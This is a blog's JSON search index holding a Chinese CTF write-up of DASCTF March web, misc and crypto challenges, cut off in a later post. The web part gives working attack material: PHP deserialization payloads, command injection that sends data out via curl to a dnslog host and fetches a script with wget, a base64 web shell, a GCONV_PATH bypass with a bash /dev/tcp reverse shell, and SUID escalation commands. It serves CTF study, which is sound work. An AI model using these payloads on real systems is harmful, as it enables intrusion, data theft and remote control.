{"meta":{"title":"Ethe's blog","subtitle":"Etheの博客","description":"","author":"Ethe","url":"https://Ethe448.github.io","root":"/"},"pages":[{"title":"404","date":"2022-01-17T03:58:22.000Z","updated":"2022-01-17T03:58:42.774Z","comments":true,"path":"404/index.html","permalink":"https://ethe448.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:25.024Z","comments":true,"path":"about/index.html","permalink":"https://ethe448.github.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-01-16T13:54:11.000Z","updated":"2022-01-17T07:10:36.704Z","comments":true,"path":"contact/index.html","permalink":"https://ethe448.github.io/contact/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:57:26.689Z","comments":true,"path":"categories/index.html","permalink":"https://ethe448.github.io/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-16T13:54:20.000Z","updated":"2022-01-16T13:55:40.821Z","comments":true,"path":"friends/index.html","permalink":"https://ethe448.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:57.523Z","comments":true,"path":"tags/index.html","permalink":"https://ethe448.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"dasctf三月赛复现","slug":"dasctf三月赛复现","date":"2022-03-30T05:43:48.000Z","updated":"2022-03-31T14:01:06.498Z","comments":true,"path":"2022/03/30/dasctf三月赛复现/","link":"","permalink":"https://ethe448.github.io/2022/03/30/dasctf%E4%B8%89%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"WEB感觉这次的题不是很难，不至于像之前那样复现都复现不了，不过自己还是太菜了，web只出了一个 ezpop确实是一个简单的php &lt;?php class crow &#123; public $v1; public $v2; function eval() &#123; echo new $this-&gt;v1($this-&gt;v2); &#125; public function __invoke() &#123; $this-&gt;v1-&gt;world(); &#125; &#125; class fin &#123; public $f1; public function __destruct()&#x2F;&#x2F;反序列化的入口 &#123; echo $this-&gt;f1 . &#39;114514&#39;; &#125; public function run() &#123; ($this-&gt;f1)(); &#125; public function __call($a, $b) &#123; echo $this-&gt;f1-&gt;get_flag(); &#125; &#125; class what &#123; public $a; public function __toString() &#123; $this-&gt;a-&gt;run(); return &#39;hello&#39;; &#125; &#125; class mix &#123; public $m1; public function run() &#123; ($this-&gt;m1)(); &#125; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; if (isset($_POST[&#39;cmd&#39;])) &#123; unserialize($_POST[&#39;cmd&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; 完整的反序列化链为 fin::destruct-&gt;what::tostring-&gt;mix::run-&gt;crow::invoke-&gt;fin::call-&gt;mix:get_flag 在get_flag函数里可以利用换行符来防止自己的命令被其中的井号注释，达到命令执行的目的 class crow &#123; public $v1; public $v2; &#125; class fin &#123; public $f1; &#125; class what &#123; public $a; &#125; class mix &#123; public $m1; public function get_flag() &#123; eval(&#39;#&#39; . $this-&gt;m1); &#125; &#125; $a &#x3D; new fin(); $a -&gt;f1 &#x3D; new what(); $a -&gt;f1-&gt;a &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1 &#x3D; new crow(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1 &#x3D; new fin(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1 &#x3D; new mix(); $a -&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1 &#x3D; &quot;%0a;system(&#39;ls&#39;);&quot;; echo serialize($a); &#x2F;&#x2F;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:17:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 因为我这里是用的%0a，应该是解析的时候把它变成了\\n，所以这个值的长度其实是要比反序列化出的长度要少1 最终payload： O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:16:&quot;%0a;system(&#39;ls&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; 然后cat读文件 O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:162:&quot;%0a;system(&#39;cat H0mvz850A.php H0mvz850B.php H0mvz850C.php H0mvz850D.php H0mvz850E.php H0mvz850F.php H0mvz850G.php H0mvz850q.php H0mvz850z.php flag.php index.php&#39;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125; calcapp.py #coding&#x3D;utf-8 from flask import Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory import random from urllib import parse import os from werkzeug.utils import secure_filename import time app&#x3D;Flask(__name__) def waf(s): blacklist &#x3D; [&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;] flag &#x3D; True for no in blacklist: if no.lower() in s.lower(): flag&#x3D; False print(no) break return flag @app.route(&quot;&#x2F;&quot;) def index(): &quot;欢迎来到SUctf2022&quot; return render_template(&quot;index.html&quot;) @app.route(&quot;&#x2F;calc&quot;,methods&#x3D;[&#39;GET&#39;]) def calc(): ip &#x3D; request.remote_addr num &#x3D; request.values.get(&quot;num&quot;) log &#x3D; &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; .&#x2F;tmp&#x2F;log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) if waf(num): try: data &#x3D; eval(num) os.system(log) except: pass return str(data) else: return &quot;waf!!&quot; if __name__ &#x3D;&#x3D; &quot;__main__&quot;: app.run(host&#x3D;&#39;0.0.0.0&#39;,port&#x3D;5000) 对输入的内容先当作python语句执行，然后再执行log 比赛的时候想的是绕过然后ssti注入，但是过滤的实在太多了 所以只能放弃ssti来想对os.system的利用 因为log = &quot;echo {0} {1} {2}&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;,time.localtime()),ip,num) 也就是说它会把这些内容输出存到log.txt里 本地尝试一下可以发现，如果echo 里用反引号加命令是可以执行的，而执行的结果会输入到log.txt中 但是如果我们直接将 num&#x3D;&#96;ls&#96; 输入，就会导致前边的eval函数报错，也就不会执行后面的system了。所以这时候我们就要利用井号来进行注释 #再python中作为注释符来使用，但是在Linux中只有在句首的位置才能当作注释 我们可以利用这个特性来实现对eval的绕过 #将后边的值都注释了，也就不会让eval报错了 而对于Linux 既然井号可以绕过eval来执行我们的命令，那我们再试试能不能利用通配符直接读flag（这里其实应该先外带log.txt的内容看flag在的文件名的，但是复现的时候忘了 http:&#x2F;&#x2F;95b2c2f7-fe16-46a0-bdf8-81f18ab7b14e.node4.buuoj.cn:81&#x2F;calc?num&#x3D;7%23&#96;curl%09\\&#96;cat%09*1*\\&#96;.locsor.dnslog.cn&#96; 成功了 但是显然因为dnslog一次只能带一条信息，而|有被ban掉了，不能利用sed来看其他的文件，所以猜到flag的难度很大，所以我们可以用wget来让靶机反弹shell &#x2F;calc?num&#x3D;7%23&#96;wget%09-P%09&#x2F;var%09http:&#x2F;&#x2F;117.50.172.142&#x2F;1.sh&#96; 给一个可执行权限 &#x2F;calc?num&#x3D;7*7%23&#96;chmod%09777%09&#x2F;var&#x2F;1.sh&#96; 然后执行 &#x2F;calc?num&#x3D;7*7%23&#96;&#x2F;var&#x2F;1.sh&#96; 拿到flag，和dnslog外带的结果一样 upgdstore只能传php，但是传php又会被过滤 这里把Content-Type改成image/jpeg就能绕过 eval应该是被过滤了，传马传不上去，可以先传个phpinfo()看看 第一次见这么多的disable_functions 但是show_source，file_get_contents没被ban，可以用这个读取源码 &lt;?php (&#39;sho&#39;.&#39;w_source&#39;)(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;);&#x2F;&#x2F;这里拼接绕过是因为这个函数是被放了黑名单里了 ?&gt; index.php HTTP&#x2F;1.1 200 OK Server: openresty Date: Sat, 26 Mar 2022 09:01:18 GMT Content-Type: text&#x2F;html; charset&#x3D;UTF-8 Content-Length: 1695 Connection: close Vary: Accept-Encoding &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php function fun($var): bool&#123; $blacklist &#x3D; [&quot;\\$_&quot;, &quot;eval&quot;,&quot;copy&quot; ,&quot;assert&quot;,&quot;usort&quot;,&quot;include&quot;, &quot;require&quot;, &quot;$&quot;, &quot;^&quot;, &quot;~&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;,&quot;file&quot;,&quot;fopen&quot;,&quot;fwriter&quot;,&quot;fput&quot;,&quot;copy&quot;,&quot;curl&quot;,&quot;fread&quot;,&quot;fget&quot;,&quot;function_exists&quot;,&quot;dl&quot;,&quot;putenv&quot;,&quot;system&quot;,&quot;exec&quot;,&quot;shell_exec&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;proc_close&quot;, &quot;proc_get_status&quot;,&quot;checkdnsrr&quot;,&quot;getmxrr&quot;,&quot;getservbyname&quot;,&quot;getservbyport&quot;, &quot;syslog&quot;,&quot;popen&quot;,&quot;show_source&quot;,&quot;highlight_file&quot;,&quot;&#96;&quot;,&quot;chmod&quot;]; foreach($blacklist as $blackword)&#123; if(strstr($var, $blackword)) return True;&#x2F;&#x2F;strstr大小写敏感，所以可以用大写绕过这个黑名单 &#125; return False; &#125; error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;.&#x2F;uploads&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); if(!preg_match(&quot;&#x2F;php&#x2F;i&quot;, strtolower($ext)))&#123; die(&quot;只要好看的php&quot;); &#125; $content &#x3D; file_get_contents($temp_file); if(fun($content))&#123; die(&quot;诶，被我发现了吧&quot;); &#125; $new_file_name &#x3D; md5($file_name).&quot;.&quot;.$ext; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 既然要绕过disable_functions,我们就要想到利用so文件 使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 但是在so文件中有些符号会被这个文件上传页面的黑名单过滤 所以这里我们要采用自己写一个文件上传的无黑名单的页面来绕过 1.php PGRpdiBjbGFzcz0ibGlnaHQiPjxzcGFuIGNsYXNzPSJnbG93Ij4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0IiBvbnN1Ym1pdD0icmV0dXJuIGNoZWNrRmlsZSgpIj4KICAgIOWYv+S8meiuoe+8jOS8oOS4queBq++8n++8gQogICAgPGlucHV0IGNsYXNzPSJpbnB1dF9maWxlIiB0eXBlPSJmaWxlIiBuYW1lPSJ1cGxvYWRfZmlsZSIvPgogICAgPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+CjwvZm9ybT4KPC9zcGFuPjxzcGFuIGNsYXNzPSJmbGFyZSI+PC9zcGFuPjxkaXY+Cjw&#x2F;cGhwCmVycm9yX3JlcG9ydGluZygwKTsKLy&#x2F;orr7nva7kuIrkvKDnm67lvZUKZGVmaW5lKCJVUExPQURfUEFUSCIsICIvdG1wIik7CiRtc2cgPSAiVXBsb2FkIFN1Y2Nlc3MhIjsKaWYgKGlzc2V0KCRfUE9TVFsnc3VibWl0J10pKSB7CiR0ZW1wX2ZpbGUgPSAkX0ZJTEVTWyd1cGxvYWRfZmlsZSddWyd0bXBfbmFtZSddOwokZmlsZV9uYW1lID0gJF9GSUxFU1sndXBsb2FkX2ZpbGUnXVsnbmFtZSddOwokZXh0ID0gcGF0aGluZm8oJGZpbGVfbmFtZSxQQVRISU5GT19FWFRFTlNJT04pOwovL3h4eHh4CiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJHRlbXBfZmlsZSk7CgokbmV3X2ZpbGVfbmFtZSA9ICRmaWxlX25hbWU7CiAgICAgICAgJGltZ19wYXRoID0gVVBMT0FEX1BBVEggLiAnLycgLiAkbmV3X2ZpbGVfbmFtZTsKICAgICAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCR0ZW1wX2ZpbGUsICRpbWdfcGF0aCkpewogICAgICAgICAgICAkaXNfdXBsb2FkID0gdHJ1ZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkbXNnID0gJ1VwbG9hZCBGYWlsZWQhJzsKICAgICAgICAgICAgZGllKCk7CiAgICAgICAgfQogICAgICAgIGVjaG8gJzxkaXYgc3R5bGU9ImNvbG9yOiNGMDAiPicuJG1zZy4iIExvb2sgaGVyZX4gIi4kaW1nX3BhdGguIjwvZGl2PiI7Cn0K base64解码后实际的内容 &lt;div class&#x3D;&quot;light&quot;&gt;&lt;span class&#x3D;&quot;glow&quot;&gt; &lt;form enctype&#x3D;&quot;multipart&#x2F;form-data&quot; method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return checkFile()&quot;&gt; 嘿伙计，传个火？！ &lt;input class&#x3D;&quot;input_file&quot; type&#x3D;&quot;file&quot; name&#x3D;&quot;upload_file&quot;&#x2F;&gt; &lt;input class&#x3D;&quot;button&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;upload&quot;&#x2F;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;flare&quot;&gt;&lt;&#x2F;span&gt;&lt;div&gt; &lt;?php error_reporting(0); &#x2F;&#x2F;设置上传目录 define(&quot;UPLOAD_PATH&quot;, &quot;&#x2F;tmp&quot;); $msg &#x3D; &quot;Upload Success!&quot;; if (isset($_POST[&#39;submit&#39;])) &#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION); &#x2F;&#x2F;xxxxx $content &#x3D; file_get_contents($temp_file); $new_file_name &#x3D; $file_name; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $new_file_name; if (move_uploaded_file($temp_file, $img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;Upload Failed!&#39;; die(); &#125; echo &#39;&lt;div style&#x3D;&quot;color:#F00&quot;&gt;&#39;.$msg.&quot; Look here~ &quot;.$img_path.&quot;&lt;&#x2F;div&gt;&quot;; &#125; 同时我们还要串一个一句话木马来包含这个文件，使这段base64加密的东西可以被解析 &lt;?php Eval(base64_decode(&#39;ZXZhbCgkX1BPU1RbJ2EnXSk&#x3D;&#39;).&#39;;&#39;);&#x2F;&#x2F;注意eval里的分号是要拼接上去，而不是直接加上 ?&gt; //实际上这里做题的时候经常报错，但是用get方法取值就没问题,所以我下面都用的get的一句话木马 再利用include和php://filter来让之前我们写的页面的代码执行 a&#x3D;include(base64_decode(&#39;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT05YmMwOWVlNGUwZWI5MTg0MGY3YzUyMDdlMWQ4NDg1Mi5waHA&#x3D;&#39;)); 里面这段base64加密的内容是 php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;9bc09ee4e0eb91840f7c5207e1d84852.php 现在我们就可以根据使用GCONV_PATH与iconv进行bypass disable_functions_lesion__的博客-CSDN博客 这篇文章里的东西进行提交了 首先是gconv-modules文件 module 自定义字符集名字（大写）&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 module INTERNAL 自定义字符集名字（大写）&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;自定义字符集名字（小写） 2 根据题目我们可以改成aa module A&#x2F;&#x2F; INTERNAL ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 module INTERNAL A&#x2F;&#x2F; ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;a 2 然后是so文件 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;希望执行的命令&quot;); &#125; 我们可以写成 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; void gconv() &#123;&#125; void gconv_init() &#123; system(&quot;bash -c &#39;exec bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1&#39;&quot;); &#125; 然后编译 gcc 源代码文件名.c -o 自定义字符集名.so -shared -fPIC 上传 然后书写shell.php &lt;?php putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;); iconv(&quot;自定义字符集名&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;); ?&gt; 我们就直接传参 a&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);include(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.iconv.a.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;a.so&#39;); shell弹出来了 但是要访问flag文件权限不够 suid提权Linux提权-suid提权 - 走看看 (zoukankan.com) find / -user root -perm -4000 -print 2&gt;/dev/null 这步不知道为什么我没有复现成功，只输出了三个值就卡住了 但是可以用别的命令看看 find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null 最后就是看到nl有权限，用nl读取flag就行 MISC月圆之夜 我破译了神级彩蛋！这款游戏竟然藏了这么多剧情？《月圆之夜》究竟讲了什么故事？_单机游戏热门视频 (bilibili.com) B站有解密的，对着找就行 CRYPTOFlowerCipher# python3 from secret import flag import random # flag &#x3D; b&#39;flag&#123;%s&#125;&#39; % md5(something).hexdigest() # note that md5 only have characters &#39;abcdef&#39; and digits def Flower(x, key): flower &#x3D; random.randint(0, 4096) return x * (key ** 3 + flower) flag &#x3D; flag[5:-1] rounds &#x3D; len(flag) L, R &#x3D; 1, 0 for i in range(rounds): L, R &#x3D; R + Flower(L, flag[i]), L print(L, R) &#39;&#39;&#39; 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003 &#39;&#39;&#39; 加密方式就是把flag的字符转成md5然后再转成ascii码后套在Flower函数里计算，然后对RL重新赋值，这样的R其实就 是前一个L的值，而实际上L = 上一个R + 上一个L乘上(key ** 3 + flower)， 显然 L1 * (key ** 3 + flower)是能被L1整除的，而R1不行 所以L2/L1的余数就是L2 这样我们可以得到所有的L和R R &#x3D; &#123;0: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 1: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 2: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 3: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 4: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 5: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 6: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 7: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 8: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 9: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 10: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 11: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 12: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 13: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 14: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 15: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 16: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 17: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 18: 241267801518963217329803327254141129383508497053892152707957403620167975, 19: 240324048977128823416619126180138745528644638124733113619292984561, 20: 1501209023627137765492979001172871435243212151481455508796928, 21: 11731219952144596819377276074864534430521345582519171825, 22: 11050144307727113700681557772687121323224647867153, 23: 10722465754210488857842384539746544074196670, 24: 67952303343509961405922862120527631953, 25: 424678007756192434300006917804988, 26: 449366186013055209469307061, 27: 2694478038943586736328, 28: 24316418691677517, 29: 137492755075, 30: 133317, 31: 1, 32: 0&#125; L &#x3D; &#123;0: 15720197268945348388429429351303006925387388927292304717594511259390194100850889852747653387197205392431053069043632340374252629529419776874410817927770922310808632581666181899, 1: 139721425176294317602347104909475448503147767726747922243703132013053043430193232376860554749633894589164137720010858254771905261753520854314908256431590570426632742469003, 2: 935298420671754230833014738849730432588169238033228173469583131476419084794695511761146278309606770027490667271610796624269392034586175088396235641537756093736185366, 3: 7402968320895532116930768370098929764678065093602516751185225609968053961398195671796668035067389408306736179462173593882795916384659802649189800851665219198361, 4: 41491807647864532203061547188977816042392604608090542687445179257686072390683442091157724792609311622180322599523073162631870961894947012137520634996058265, 5: 363542281260527120641507826394376579427002124891256726811704925452455933892306777570036028677323021255266880206017499363363356743613369155668503557061, 6: 3038050870004975946934828279229998090001629942971672705946371743686684953534372767609080560274203027849883925292484330032865963662762987021572213, 7: 3121683903445470016877317983137081025437455800044243487676152297523129079630621593231064333666220053742946978640516933836161839706107832842, 8: 16713517279670522179142602316669021266414545548551242366498025076135157482269671171234675566764239156725485371108735804221489129242235, 9: 17728566345779292838907909381612640668036643431117165902908905722221490552536570008262521006387722966311695266888986102760148482, 10: 18822751726365286700612339826340137082689797360168751039458371318582478795225200597245268849966216725478600774872948579145, 11: 19346619488865481717482094100686681292384530125288986759529832156605546935716879938892385301891033660176897469426477, 12: 19304497076225869711849746340455541612339463403087957113496859433662333338211557279788474751973335123601723351, 13: 19287157921091613716265688246942013055491723611322575658962386161345041119412098008892719335475158074595, 14: 163194634853135239779527687110852732238802459017066087158243026833107794785760861815584881897662446, 15: 973825402922208545745882895848854992390620148165434035074196392656950555217820068399921894085, 16: 6028609474886885541605763758989943967354486126474121155263363791803356933057570965004061, 17: 5830376668137452804173383567980586211563348379884185911787096393298400138955904511, 18: 32759342090485149698017824597983901673872922475506121132811189377165700630061, 19: 241267801518963217329803327254141129383508497053892152707957403620167975, 20: 240324048977128823416619126180138745528644638124733113619292984561, 21: 1501209023627137765492979001172871435243212151481455508796928, 22: 11731219952144596819377276074864534430521345582519171825, 23: 11050144307727113700681557772687121323224647867153, 24: 10722465754210488857842384539746544074196670, 25: 67952303343509961405922862120527631953, 26: 424678007756192434300006917804988, 27: 449366186013055209469307061, 28: 2694478038943586736328, 29: 24316418691677517, 30: 137492755075, 31: 133317, 32: 1&#125; 然后再用(L[i]-R[i+1])//L[i+1]求出flag[i]**3 + flower的值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; 由于1的ascii的三次方和2的ascii码之间的差值也要比最大的flower大，所以我们就可以遍历一下 得到flag值 FLAG &#x3D; &#123;0: 112511, 1: 149387, 2: 126341, 3: 178420, 4: 114132, 5: 119663, 6: 973209, 7: 186776, 8: 942745, 9: 941869, 10: 972922, 11: 1002182, 12: 1000899, 13: 118185, 14: 167581, 15: 161534, 16: 1034000, 17: 177976, 18: 135780, 19: 1003927, 20: 160087, 21: 127967, 22: 1061635, 23: 1030560, 24: 157794, 25: 160009, 26: 945060, 27: 166773, 28: 110809, 29: 176856, 30: 1031322, 31: 133317&#125; flag &#x3D; &#39;&#39; for i in range(32): #FLAG[i] &#x3D; (L[i]-R[i+1])&#x2F;&#x2F;L[i+1] for j in range(48,123): if j**3 &lt;&#x3D; FLAG[i] and (j+1)**3 &gt; FLAG[i]: flag +&#x3D; chr(j) else: continue print(&#39;flag&#x3D;&#39;+flag[::-1]) &#x2F;&#x2F;3e807b66ef26d38e671ddcbb9c108250","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"sqlilab","slug":"sqlilab","date":"2022-03-16T13:30:05.000Z","updated":"2022-03-28T08:23:07.819Z","comments":true,"path":"2022/03/16/sqlilab/","link":"","permalink":"https://ethe448.github.io/2022/03/16/sqlilab/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"从一道ctf题看php原生类","slug":"从一道ctf题看php原生类","date":"2022-02-25T13:06:44.000Z","updated":"2022-03-28T08:20:43.039Z","comments":true,"path":"2022/02/25/从一道ctf题看php原生类/","link":"","permalink":"https://ethe448.github.io/2022/02/25/%E4%BB%8E%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9C%8Bphp%E5%8E%9F%E7%94%9F%E7%B1%BB/","excerpt":"","text":"这是ctfshow的一道比赛题 先来看看源码 &lt;?php error_reporting(0); if(isset($_GET[&#39;source&#39;]))&#123; highlight_file(__FILE__); echo &quot;\\$flag_filename &#x3D; &#39;flag&#39;.md5(???).&#39;php&#39;;&quot;; die(); &#125; if(isset($_POST[&#39;a&#39;]) &amp;&amp; isset($_POST[&#39;b&#39;]) &amp;&amp; isset($_POST[&#39;c&#39;]))&#123; $c &#x3D; $_POST[&#39;c&#39;]; $count[++$c] &#x3D; 1; if($count[] &#x3D; 1) &#123; $count[++$c] 